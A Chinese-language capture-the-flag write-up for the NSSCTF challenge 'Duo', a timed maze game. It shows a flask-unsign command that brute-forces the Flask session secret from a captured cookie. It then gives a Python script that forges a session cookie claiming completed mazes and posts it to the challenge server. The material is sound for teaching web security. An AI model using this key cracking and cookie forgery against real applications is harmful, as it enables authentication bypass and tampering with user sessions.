## [NSSRound#30 Duo]你也是迷宫高手吗

* 考点：JWT秘钥爆破
* 工具：flask-unsign

这道题需要爆破JWT的密钥，然后利用得到的秘钥重新构建jwt，将通关次数和时间进行修改，然后替换原有的cookie发送请求
有一个需要注意的点事由于提交时间只有10秒钟，所以最好直接通过脚本实现提交并捕获响应的html

jwt解析网站：[JSON Web Tokens - jwt.io](https://jwt.io/)

可以先通过抓包获取一个jwt，这里的jwt中的payload段为二进制字节，jwt-tool不能识别，爆破有问题，所以使用flask-unsign

![](./img/DUO-1.png)

填如cookie后执行命令爆破密码：

```sh
flask-unsign --unsign --cookie "eyJjb21wbGV0ZWRfbWF6ZXMiOjAsInN0YXJ0X3RpbWUiOjE3NDg1MjU5NTguODE2NjkxNH0.aDhjhg.U1PH_cd2fPgsL46kad950_bsA8E"
```

![](./img/DUO-2.png)

使用下面的这个脚本发送请求捕获html

```py
#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import time
import requests
from flask import Flask
from flask.sessions import SecureCookieSessionInterface

# —— 配置区 —— #
SECRET_KEY = "supersecretkey"
TARGET_URL = "http://node7.anna.nssctf.cn:20995/"

def sign_flask_session(data: dict, secret: str) -> str:
    """
    用 Flask 的内置 SecureCookieSessionInterface 对 data 签名，
    返回可以直接当作 session cookie 的字符串。
    """
    app = Flask(__name__)
    app.secret_key = secret
    serializer = SecureCookieSessionInterface().get_signing_serializer(app)
    return serializer.dumps(data)

def main():
    session = requests.Session()

    # 举例做一次请求，你可以放在循环里做多次
    payload = {
        "completed_mazes": 10,
        "start_time": time.time()
    }
    signed_cookie = sign_flask_session(payload, SECRET_KEY)

    # 把签名好的 session cookie 设到 requests.Session 里
    session.cookies.set("session", signed_cookie, domain="node7.anna.nssctf.cn")

    # 发送 GET 请求
    resp = session.get(TARGET_URL)
    resp.raise_for_status()

    # 输出状态码和前 200 字符做预览
    print(f"[{resp.status_code}] →", resp.text[:200].replace("\n"," "))

    # 如果你要保存最后一次的完整 HTML 到文件：
    with open("final_response.html", "w", encoding="utf-8") as f:
        f.write(resp.text)
    print("✅ 最后一次返回的 HTML 已保存到 final_response.html")

if __name__ == "__main__":
    main()
```

打开得到的html文件，可以看到如下内容：

![](./img/DUO-4.png)
